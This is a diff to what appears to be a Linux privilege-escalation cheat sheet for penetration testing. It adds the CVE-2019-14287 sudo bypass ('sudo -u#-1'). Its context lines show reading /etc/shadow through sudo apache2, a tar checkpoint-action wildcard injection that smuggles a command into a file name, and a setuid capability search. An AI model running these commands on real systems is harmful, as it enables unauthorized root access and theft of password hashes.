@@ -85,11 +85,16 @@ run post/multi/recon/local_exploit_suggester
 
 # Privilege-Escalation ✅📚
 ## sudo ✅📚
+[Every-Tools-Shell-Escap](https://gtfobins.github.io/)
 ### Shell Escape Sequences ✡️
 ```bash
 sudo -l
 ```
-[Every-Tools-Shell-Escap](https://gtfobins.github.io/)
+#### If "(ALL, !root)" existed. 🔆
+```bash
+# CVE-2019-14287 (sudo versions < 1.8.28) -- 1.8.28 fixed
+sudo -u#-1 /usr/bin/<somecommand> # go to # https://gtfobins.github.io/#
+```
 #### If "/usr/sbin/apache2" existed. 🔆
 ```bash
 sudo apache2 -f /etc/shadow # read line 1 (root-hash)
@@ -209,7 +214,7 @@ touch /home/user/--checkpoint-action=exec=bash\ runme.sh # target machine
 ## Capabilities ✅
 ```bash
 getcap -r / 2>/dev/null # If "cap_setuid+ep" existed. 
-go to # https://gtfobins.github.io/#
+# go to # https://gtfobins.github.io/#
 ```
 ## **SUID_SGID** ✅
 ### Known Exploits ✡️
